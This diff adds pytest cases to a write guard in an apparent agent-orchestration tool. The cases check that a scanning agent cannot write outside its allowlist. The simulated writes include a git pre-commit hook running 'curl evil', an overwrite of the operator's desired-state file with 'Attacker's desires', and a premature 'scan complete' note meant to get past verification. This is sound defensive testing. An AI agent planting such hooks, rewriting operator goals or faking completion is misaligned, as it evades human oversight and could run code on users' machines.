@@ -361,6 +361,58 @@ class TestScanWriteGuard:
         with pytest.raises(click.ClickException, match="dev.yaml"):
             await self._run_scan(stores, monkeypatch, writes)
 
+    async def test_desired_state_rewrite_fails(self, stores, monkeypatch):
+        create_stub(stores["project_path"], name="proj")
+        onboard = stores["project_path"] / ".jig" / "onboard"
+        onboard.mkdir(parents=True, exist_ok=True)
+        (onboard / "desired-state.md").write_text("# Operator's desires\n")
+
+        async def writes(ctx):
+            (ctx.worktree_path / ".jig" / "onboard" / "desired-state.md").write_text(
+                "# Attacker's desires\n"
+            )
+
+        with pytest.raises(click.ClickException, match="desired-state.md"):
+            await self._run_scan(stores, monkeypatch, writes)
+
+    async def test_violation_persists_and_poisons_resume(self, stores, monkeypatch):
+        create_stub(stores["project_path"], name="proj")
+
+        async def writes(ctx):
+            hooks = ctx.worktree_path / ".git" / "hooks"
+            hooks.mkdir(parents=True, exist_ok=True)
+            (hooks / "pre-commit").write_text("#!/bin/sh\ncurl evil\n")
+            # The scan-done note lands before verification runs — the
+            # realistic bypass shape the guard must survive.
+            await ctx.threads.post(
+                Note(
+                    ticket_id="onboard-scan",
+                    author="scanner",
+                    text="scan complete",
+                    payload={"kind": "onboard_scan_done"},
+                )
+            )
+
+        with pytest.raises(click.ClickException, match="outside its allowlist"):
+            await self._run_scan(stores, monkeypatch, writes)
+        # A bare re-run must NOT proceed to the PO pass.
+        assert await _classify(stores) == OnboardResumeState.BROKEN
+
+    async def test_crash_resume_claude_md_rewrite_allowed(self, stores, monkeypatch):
+        create_stub(stores["project_path"], name="proj")
+        project_yaml = stores["project_path"] / ".jig" / "project.yaml"
+        pdata = yaml.safe_load(project_yaml.read_text())
+        pdata["claude_md_preexisting"] = False
+        project_yaml.write_text(yaml.safe_dump(pdata))
+        # Partial artifact from a scanner run that crashed before
+        # onboard_finish_scan — present in this spawn's before-snapshot.
+        (stores["project_path"] / "CLAUDE.md").write_text("# half-written\n")
+
+        async def writes(ctx):
+            (ctx.worktree_path / "CLAUDE.md").write_text("# finished\n")
+
+        await self._run_scan(stores, monkeypatch, writes)
+
 
 class TestPoReadPass:
     async def test_creates_brief_with_read_mode_and_observations(
